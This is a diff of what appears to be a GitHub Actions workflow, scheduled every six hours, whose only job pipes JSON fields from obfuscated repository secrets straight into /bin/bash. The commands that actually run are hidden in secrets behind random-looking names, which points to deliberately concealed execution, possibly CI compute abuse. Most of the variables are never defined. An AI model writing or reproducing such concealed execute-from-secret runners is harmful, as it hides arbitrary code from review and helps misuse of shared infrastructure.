@@ -3,9 +3,8 @@ name: wanghuangzi4536
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 2/6 * * *'
-
-jobs:  # 5802
+    - cron: '26 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,17 +12,14 @@ jobs:  # 5802
       - uses: actions/checkout@v4
       - name: wanghuangzi4536
         env:
-          t8884: ${{ secrets.t8884 }}
+          tqgpe31: ${{ secrets.tqgpe31 }}
         run: |
-          echo $t8884 | jq -r .lze747 | /bin/bash
-          echo $xzz2673 | jq -r .ykxg776 | /bin/bash
-          echo $knnxt41 | jq -r .zl55 | /bin/bash
-          echo $vrmyy6662 | jq -r .lmu14354 | /bin/bash
-          echo $tqs63 | jq -r .mt9888 | /bin/bash
-          echo $wlwh74882 | jq -r .fo54 | /bin/bash
-          echo $vtefa0380 | jq -r .fyvnq872 | /bin/bash
-          echo $jcow271 | jq -r .vf67434 | /bin/bash
-          echo $f0689 | jq -r .be2 | /bin/bash
-          echo $y2 | jq -r .wfo93811 | /bin/bash
-          echo $c4 | jq -r .d2 | /bin/bash
+          echo $tqgpe31 | jq -r .smx0 | /bin/bash
+          echo $yz1 | jq -r .g571 | /bin/bash
+          echo $tewuj4847 | jq -r .ntwf80106 | /bin/bash
+          echo $pn6712 | jq -r .fpt26 | /bin/bash
+          echo $o5859 | jq -r .iyobv39 | /bin/bash
+          echo $yq81 | jq -r .xdx13 | /bin/bash
+          echo $yrani169 | jq -r .kpwmq968 | /bin/bash
+          echo $pg566 | jq -r .py1 | /bin/bash
 
